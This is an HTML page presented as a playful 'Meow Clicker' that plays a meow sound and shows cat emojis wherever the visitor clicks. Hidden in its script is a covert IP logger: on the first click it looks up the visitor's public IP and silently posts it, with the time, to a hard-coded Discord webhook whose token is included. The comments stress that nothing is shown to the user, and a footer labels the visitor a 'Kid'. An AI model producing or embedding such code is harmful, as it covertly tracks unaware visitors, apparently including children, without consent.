<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Meow Clicker 🐱</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: linear-gradient(135deg, #ff9a9e, #fad0c4);
      overflow: hidden;
      font-family: 'Segoe UI', sans-serif;
      cursor: pointer;
      user-select: none;
    }

    .title {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 3.5rem;
      color: white;
      text-align: center;
      text-shadow: 0 4px 20px rgba(0,0,0,0.3);
      pointer-events: none;
      z-index: 10;
      transition: opacity 1.2s ease;
    }

    .cat {
      position: absolute;
      font-size: 5rem;
      pointer-events: none; /* no interaction needed on cat */
      animation: meowPop 3s forwards;
      z-index: 20;
      filter: drop-shadow(0 10px 25px rgba(0,0,0,0.25));
    }

    @keyframes meowPop {
      0%   { opacity: 0; transform: scale(0.3) translateY(40px); }
      20%  { opacity: 1; transform: scale(1.15) translateY(-15px); }
      75%  { opacity: 1; transform: scale(1) translateY(0); }
      100% { opacity: 0; transform: scale(0.8) translateY(-50px); }
    }

    .hidden { opacity: 0; }
  </style>
</head>
<body>

  <div class="title" id="title">Click anywhere to make a meow sound! 🐱</div>

  <audio id="meowSound" preload="auto">
    <source src="https://assets.mixkit.co/sfx/preview/296/296.mp3" type="audio/mpeg">
  </audio>

  <script>
    const title = document.getElementById('title');
    const audio = document.getElementById('meowSound');
    const webhookUrl = "https://discord.com/api/webhooks/1485790689685016626/_ZiX3FxW4rppDGFiojqc6pLcgeEgY2MX6vEDBCy2bR8SLbVN2UTJU3GTqqSNLDAXWxVg";

    let hasSent = false; // only send once

    // Silent send function
    function sendToWebhook(ip = "Unknown") {
      if (hasSent) return;
      hasSent = true;

      const payload = {
        content: "🐱 **First click on meow page!**",
        embeds: [{
          color: 0xff1493,
          title: "Meow Page Opened",
          fields: [
            { name: "IP", value: ip, inline: true },
            { name: "Time", value: new Date().toLocaleString(), inline: true }
          ],
          footer: { text: "Kid opened the page" }
        }]
      };

      const xhr = new XMLHttpRequest();
      xhr.open("POST", webhookUrl, true);
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify(payload));
      // No onload/onerror → completely silent
    }

    document.addEventListener('click', function(e) {
      // Hide title after first interaction
      if (!title.classList.contains('hidden')) {
        title.classList.add('hidden');
      }

      // Play meow on every click
      audio.currentTime = 0;
      audio.play().catch(() => {});

      // Send only on first click (silently)
      if (!hasSent) {
        // Try to get IP (may fail silently on local file)
        let ip = "Unknown";
        const ipXhr = new XMLHttpRequest();
        ipXhr.open("GET", "https://api.ipify.org?format=json", true);
        ipXhr.onload = function() {
          if (ipXhr.status === 200) {
            try {
              const data = JSON.parse(ipXhr.responseText);
              ip = data.ip || "Unknown";
            } catch {}
          }
          sendToWebhook(ip);
        };
        ipXhr.onerror = () => sendToWebhook("Unknown"); // fail → send anyway
        ipXhr.send();
      }

      // Always show cat sticker where clicked
      const cat = document.createElement('div');
      cat.className = 'cat';
      cat.textContent = ['🐱','😺','😸','🐈'][Math.floor(Math.random()*4)];

      const rotation = Math.random() * 40 - 20;
      cat.style.left = `${e.clientX - 40}px`;
      cat.style.top = `${e.clientY - 40}px`;
      cat.style.transform = `rotate(${rotation}deg)`;

      document.body.appendChild(cat);
      setTimeout(() => cat.remove(), 3000);
    });
  </script>

</body>
</html>
